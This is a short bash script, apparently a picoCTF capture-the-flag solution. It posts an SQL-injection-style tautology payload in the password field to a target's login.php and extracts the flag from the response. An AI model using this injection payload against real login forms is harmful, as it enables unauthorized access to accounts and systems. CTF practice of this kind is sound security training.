# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink=$1

response=$(curl "$webLink""login.php" \
                --silent \
                --data-raw 'password=%27+be+1%3D1%3B%23&debug=0')

flag=$(echo "$response" | grep -o --no-filename picoCTF{.*})

popd > /dev/null

# print the flag
echo $flag
